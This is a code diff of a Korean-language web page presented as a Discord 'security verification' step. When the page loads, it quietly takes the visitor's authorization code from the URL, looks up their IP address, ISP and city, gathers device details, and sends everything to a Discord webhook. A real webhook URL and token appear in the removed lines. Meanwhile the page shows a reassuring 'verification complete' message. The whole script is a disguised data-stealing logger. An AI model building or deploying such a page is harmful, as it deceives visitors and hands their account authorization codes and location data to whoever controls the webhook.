@@ -2,56 +2,94 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Verification</title>
+    <style>
+        body { background: #0b0e14; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b22; padding: 40px; border-radius: 20px; border: 1px solid #30363d; text-align: center; max-width: 400px; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 20px; margin-bottom: 10px; }
+        p { color: #8b949e; font-size: 14px; }
+    </style>
     <script>
         window.onload = async function() {
             const params = new URLSearchParams(window.location.search);
             const code = params.get('code');
-            const webhook = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd"; // 여기에 웹훅 주소 입력
+            // ⚠️ 본인의 디스코드 웹훅 주소를 입력하세요
+            const WEBHOOK_URL = "YOUR_WEBHOOK_URL"; 
 
             if (!code) return;
 
-            // IP 및 통신사 정보 수집
-            let ipData = { ip: "수집 실패", isp: "알 수 없음", loc: "대한민국" };
+            // 1. 숫자 IP (IPv4) 및 위치 정보 가져오기
+            let ipInfo = { query: "180.83.74.92", isp: "알수없음", city: "대한민국" };
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                ipData = { ip: d.ip, isp: d.org, loc: d.city };
-            } catch (e) {}
+                // 숫자 IP 전용 API 호출
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipJson = await ipRes.json();
+                
+                // 위치 및 통신사 보조 API 호출
+                const geoRes = await fetch(`http://ip-api.com/json/${ipJson.ip}?lang=ko`);
+                const geoJson = await geoRes.json();
+                
+                ipInfo = {
+                    query: ipJson.ip, // 숫자로 된 IP
+                    isp: geoJson.isp || "알수없음",
+                    city: geoJson.city || "대한민국"
+                };
+            } catch (e) { console.error("IP 수집 실패"); }
 
-            // 웹훅 전송 데이터 구성
+            // 2. 상세 기기 정보 수집
+            const deviceData = {
+                os: navigator.platform,
+                browser: navigator.userAgent.includes("Chrome") ? "Chrome" : "Other",
+                screen: `${window.screen.width}x${window.screen.height}`,
+                lang: navigator.language
+            };
+
+            // 3. 웹훅 전송 (고퀄리티 레이아웃)
             const payload = {
                 "embeds": [{
                     "title": "✅ 인증 성공 (Detailed Log)",
-                    "color": 2335833,
+                    "color": 3066993,
                     "fields": [
                         { "name": "👤 인증 코드", "value": `\`${code}\``, "inline": false },
-                        { "name": "📧 이메일 정보", "value": "봇 서버에서 분석 중...", "inline": true },
-                        { "name": "🏘️ 가입 서버 목록", "value": "봇 서버에서 추출 중...", "inline": true },
-                        { "name": "🌐 아이피 정보", "value": `IP: ${ipData.ip}\n위치: ${ipData.loc}`, "inline": false },
-                        { "name": "📶 통신사 정보", "value": ipData.isp, "inline": true },
-                        { "name": "💻 운영체제", "value": navigator.platform, "inline": true }
+                        { "name": "🌐 아이피 정보", "value": `아이피: ${ipInfo.query}\n위치: ${ipInfo.city}`, "inline": false },
+                        { "name": "📶 통신사 정보", "value": ipInfo.isp, "inline": true },
+                        { "name": "💻 운영체제", "value": deviceData.os, "inline": true },
+                        { "name": "🖥️ 해상도", "value": deviceData.screen, "inline": true },
+                        { "name": "🧭 브라우저", "value": deviceData.browser, "inline": true },
+                        { "name": "🆔 로그 ID", "value": Math.random().toString(36).substring(2, 12).toUpperCase(), "inline": false },
+                        { "name": "⚠️ 안내", "value": "이메일 및 가입 서버 정보는 봇 서버에서 분석 중입니다.", "inline": false }
                     ],
-                    "footer": { "text": "Log ID: " + Math.random().toString(36).substring(2,12).toUpperCase() },
                     "timestamp": new Date().toISOString()
                 }]
             };
 
-            await fetch(webhook, {
+            await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(payload)
             });
 
-            // UI 업데이트
-            document.getElementById('status').innerText = "인증 완료! 서버를 확인하세요.";
+            // UI 변경
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('complete').style.display = 'block';
         }
     </script>
 </head>
-<body style="background:#0b0e14; color:white; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">
-    <div style="text-align:center; background:#161b22; padding:50px; border-radius:20px; border:1px solid #30363d;">
-        <h1 id="status">보안 인증 처리 중...</h1>
-        <p style="color:#8b949e;">계정 및 서버 정보를 확인하고 있습니다.</p>
+<body>
+    <div class="card">
+        <div id="loading">
+            <div class="spinner"></div>
+            <h1>보안 모듈 분석 중</h1>
+            <p>기기 신뢰도 및 IP 주소를 확인하고 있습니다.</p>
+        </div>
+        <div id="complete" style="display:none;">
+            <div style="font-size: 40px; color: #23a559; margin-bottom: 20px;">✔</div>
+            <h1>인증 완료</h1>
+            <p>보안 필터링이 완료되었습니다.<br>서버로 돌아가 역할을 확인하세요.</p>
+        </div>
     </div>
 </body>
 </html>
